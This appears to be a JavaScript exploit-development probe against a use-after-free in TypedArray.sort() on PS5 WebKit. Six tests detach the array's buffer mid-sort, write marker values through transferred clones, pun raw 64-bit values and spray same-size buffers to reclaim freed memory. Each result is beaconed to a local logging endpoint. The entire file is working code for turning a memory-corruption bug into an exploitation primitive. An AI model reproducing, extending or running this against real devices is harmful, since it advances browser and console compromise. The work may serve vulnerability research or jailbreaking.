// p123 — Sort-Detach UAF Weaponization
// D10 confirmed: TypedArray.sort() continues 1004 comparisons after buffer detach
// on PS5 WebKit 7616 (LLInt-only). This probe characterizes the primitive:
//   W1: stale pointer still reads original data?
//   W2: structuredClone(transfer) shares memory with stale sort pointer?
//   W3: can we write through clone, sort reads our markers?
//   W4: port close + GC pressure → backing store freed → spray reclaims?
//   W5: worker terminate → backing store freed → spray reclaims?
//   W6: raw 64-bit type punning via BigUint64Array on cloned buffer
(function(){
var rid='v123w'+Math.random().toString(36).slice(2,12);
function beacon(tag,data){
  var body=typeof data==='object'?JSON.stringify(data):String(data);
  try{navigator.sendBeacon('/beacon/V123W-'+tag,JSON.stringify({r:rid,b:body}));}catch(e){}
  try{fetch('/beacon/V123W-'+tag,{method:'POST',body:JSON.stringify({r:rid,b:body}),keepalive:true}).catch(function(){});}catch(e2){}
}
beacon('L','probe123-start');
var sleep=function(ms){return new Promise(function(r){setTimeout(r,ms);});};
function withTimeout(fn,ms){
  return Promise.race([fn(),new Promise(function(_,rej){setTimeout(function(){rej(new Error('TIMEOUT_'+(ms||10000)+'ms'));},ms||10000);})]);
}
var tests=[];
function addTest(n,fn){tests.push({name:n,fn:fn});}

var ELEMS=1024;
var BYTES=ELEMS*8;
var MARKER_A=13371337.0;
var MARKER_B=73317331.0;
var DETACH_AT=20;

// W1: STALE-READ — after detach, does comparator read from stale pointer?
addTest('W1-STALE',function(){
  return withTimeout(async function(){
    var r={pre:[],post:[],detachOK:false};
    var ab=new ArrayBuffer(BYTES);
    var ta=new Float64Array(ab);
    for(var i=0;i<ELEMS;i++) ta[i]=ELEMS-i;
    var cmp=0,det=false;
    try{
      ta.sort(function(a,b){
        cmp++;
        if(cmp<=5) r.pre.push(a);
        if(cmp===DETACH_AT&&!det){
          var mc=new MessageChannel();
          mc.port1.postMessage(null,[ab]);
          det=true;
          r.detachOK=(ab.byteLength===0);
        }
        if(det&&cmp>DETACH_AT&&cmp<=DETACH_AT+10) r.post.push(a);
        return a-b;
      });
      r.sortOK=true;
    }catch(e){r.sortErr=e.constructor.name+':'+String(e.message||'').slice(0,60);}
    r.cmp=cmp;
    r.postDetachCmp=det?cmp-DETACH_AT:0;
    r.postAreInts=r.post.every(function(v){return Number.isInteger(v)&&v>0&&v<=ELEMS;});
    return r;
  },10000);
});

// W2: CLONE-SHARE — structuredClone transfer: does clone share memory with sort?
addTest('W2-CLONE',function(){
  return withTimeout(async function(){
    var r={};
    var ab=new ArrayBuffer(BYTES);
    var ta=new Float64Array(ab);
    for(var i=0;i<ELEMS;i++) ta[i]=ELEMS-i;
    var cmp=0,det=false,clone=null,cv=null;
    var markerSeen=0;
    try{
      ta.sort(function(a,b){
        cmp++;
        if(cmp===DETACH_AT&&!det){
          try{
            clone=structuredClone(ab,{transfer:[ab]});
            cv=new Float64Array(clone);
            r.cloneLen=clone.byteLength;
            r.origLen=ab.byteLength;
            for(var k=0;k<ELEMS;k++) cv[k]=MARKER_A;
            det=true;
          }catch(e){r.cloneErr=e.constructor.name+':'+String(e.message||'').slice(0,60);}
        }
        if(det&&cmp>DETACH_AT+5){
          if(a===MARKER_A) markerSeen++;
          if(b===MARKER_A) markerSeen++;
        }
        return a-b;
      });
      r.sortOK=true;
    }catch(e){r.sortErr=e.constructor.name+':'+String(e.message||'').slice(0,60);}
    r.cmp=cmp;
    r.markerSeen=markerSeen;
    r.markerPct=cmp>DETACH_AT?Math.round(markerSeen/(2*(cmp-DETACH_AT-5))*100):0;
    if(cv){
      var nonMarker=0,samples=[];
      for(var j=0;j<ELEMS;j++){
        if(cv[j]!==MARKER_A){nonMarker++;if(samples.length<20) samples.push({i:j,v:cv[j]});}
      }
      r.cloneModified=nonMarker;
      r.modSamples=samples;
    }
    return r;
  },10000);
});

// W3: BIGINT-PUN — raw 64-bit view on cloned buffer during sort
addTest('W3-BIGPUN',function(){
  return withTimeout(async function(){
    var r={rawSamples:[]};
    if(typeof BigUint64Array==='undefined'){r.skip='noBigUint64Array';return r;}
    var ab=new ArrayBuffer(BYTES);
    var ta=new Float64Array(ab);
    for(var i=0;i<ELEMS;i++) ta[i]=ELEMS-i;
    var cmp=0,det=false,clone=null,bv=null;
    try{
      ta.sort(function(a,b){
        cmp++;
        if(cmp===DETACH_AT&&!det){
          try{
            clone=structuredClone(ab,{transfer:[ab]});
            bv=new BigUint64Array(clone);
            det=true;
            bv[0]=BigInt('0x4141414141414141');
            bv[1]=BigInt('0x4242424242424242');
            bv[2]=BigInt('0x4343434343434343');
          }catch(e){r.punErr=e.constructor.name;}
        }
        if(det&&cmp>DETACH_AT&&cmp<=DETACH_AT+30){
          r.rawSamples.push({c:cmp,a:a,b:b});
        }
        return a-b;
      });
      r.sortOK=true;
    }catch(e){r.sortErr=e.constructor.name;}
    r.cmp=cmp;
    if(bv){
      var out=[];
      for(var k=0;k<10;k++) out.push('0x'+bv[k].toString(16));
      r.finalRaw=out;
    }
    return r;
  },10000);
});

// W4: RECLAIM-MC — transfer + close ports + GC pressure + spray same-size
addTest('W4-RECLAIM',function(){
  return withTimeout(async function(){
    var r={markerHits:0,postVals:[]};
    var ab=new ArrayBuffer(BYTES);
    var ta=new Float64Array(ab);
    for(var i=0;i<ELEMS;i++) ta[i]=ELEMS-i;
    var cmp=0,det=false,sprays=[];
    try{
      ta.sort(function(a,b){
        cmp++;
        if(cmp===DETACH_AT&&!det){
          var mc=new MessageChannel();
          mc.port1.postMessage(null,[ab]);
          mc.port1.close();
          mc.port2.close();
          mc=null;
          det=true;
          for(var g=0;g<200;g++){var t=new ArrayBuffer(32768);t=null;}
          for(var s=0;s<300;s++){
            var sab=new ArrayBuffer(BYTES);
            var sv=new Float64Array(sab);
            for(var k=0;k<ELEMS;k++) sv[k]=MARKER_A;
            sprays.push(sab);
          }
        }
        if(det&&cmp>DETACH_AT+5){
          if(a===MARKER_A) r.markerHits++;
          if(b===MARKER_A) r.markerHits++;
          if(r.postVals.length<30) r.postVals.push(a);
        }
        return a-b;
      });
      r.sortOK=true;
    }catch(e){r.sortErr=e.constructor.name;}
    r.cmp=cmp;
    r.markerSeen=r.markerHits>0;
    var corrupted=0;
    for(var i=0;i<sprays.length;i++){
      var ch=new Float64Array(sprays[i]);
      for(var j=0;j<ELEMS;j++){
        if(ch[j]!==MARKER_A){corrupted++;break;}
      }
    }
    r.corruptedBufs=corrupted;
    r.sprayN=sprays.length;
    return r;
  },15000);
});

// W5: RECLAIM-WK — transfer to worker + terminate + spray
addTest('W5-WORKER',function(){
  return withTimeout(async function(){
    var r={markerHits:0};
    var worker;
    try{
      var blob=new Blob(['self.onmessage=function(){}'],{type:'text/javascript'});
      worker=new Worker(URL.createObjectURL(blob));
    }catch(e){r.workerErr=e.constructor.name;return r;}
    var ab=new ArrayBuffer(BYTES);
    var ta=new Float64Array(ab);
    for(var i=0;i<ELEMS;i++) ta[i]=ELEMS-i;
    var cmp=0,det=false,sprays=[];
    try{
      ta.sort(function(a,b){
        cmp++;
        if(cmp===DETACH_AT&&!det){
          worker.postMessage(null,[ab]);
          worker.terminate();
          worker=null;
          det=true;
          for(var g=0;g<200;g++){var t=new ArrayBuffer(32768);t=null;}
          for(var s=0;s<300;s++){
            var sab=new ArrayBuffer(BYTES);
            var sv=new Float64Array(sab);
            for(var k=0;k<ELEMS;k++) sv[k]=MARKER_B;
            sprays.push(sab);
          }
        }
        if(det&&cmp>DETACH_AT+5){
          if(a===MARKER_B) r.markerHits++;
          if(b===MARKER_B) r.markerHits++;
        }
        return a-b;
      });
      r.sortOK=true;
    }catch(e){r.sortErr=e.constructor.name;}
    r.cmp=cmp;
    r.markerSeen=r.markerHits>0;
    var corrupted=0;
    for(var i=0;i<sprays.length;i++){
      var ch=new Float64Array(sprays[i]);
      for(var j=0;j<ELEMS;j++){
        if(ch[j]!==MARKER_B){corrupted++;break;}
      }
    }
    r.corruptedBufs=corrupted;
    r.sprayN=sprays.length;
    return r;
  },15000);
});

// W6: ACCESSMAP — map exactly which indices sort accesses after detach
// Writes unique value at each offset, records what sort reads
addTest('W6-ACCESSMAP',function(){
  return withTimeout(async function(){
    var r={reads:[],writebacks:[]};
    var ab=new ArrayBuffer(BYTES);
    var ta=new Float64Array(ab);
    for(var i=0;i<ELEMS;i++) ta[i]=ELEMS-i;
    var cmp=0,det=false,clone=null,cv=null;
    try{
      ta.sort(function(a,b){
        cmp++;
        if(cmp===DETACH_AT&&!det){
          try{
            clone=structuredClone(ab,{transfer:[ab]});
            cv=new Float64Array(clone);
            det=true;
            for(var k=0;k<ELEMS;k++) cv[k]=-(k+1);
          }catch(e){r.err=e.constructor.name;}
        }
        if(det&&cmp>DETACH_AT&&r.reads.length<200){
          r.reads.push({c:cmp,a:a,b:b});
        }
        return a-b;
      });
      r.sortOK=true;
    }catch(e){r.sortErr=e.constructor.name;}
    r.cmp=cmp;
    if(cv){
      var changed=0,samples=[];
      for(var j=0;j<ELEMS;j++){
        if(cv[j]!==-(j+1)){changed++;if(samples.length<30) samples.push({i:j,was:-(j+1),now:cv[j]});}
      }
      r.changedSlots=changed;
      r.changeSamples=samples;
    }
    return r;
  },10000);
});

async function runAll(){
  for(var t=0;t<tests.length;t++){
    var test=tests[t];
    try{
      var result=await test.fn();
      beacon(test.name,result);
    }catch(e){
      beacon(test.name,{error:e.constructor.name+':'+String(e.message||'').slice(0,100)});
    }
    await sleep(500);
  }
  beacon('DONE','all-'+tests.length);
}
runAll();
})();
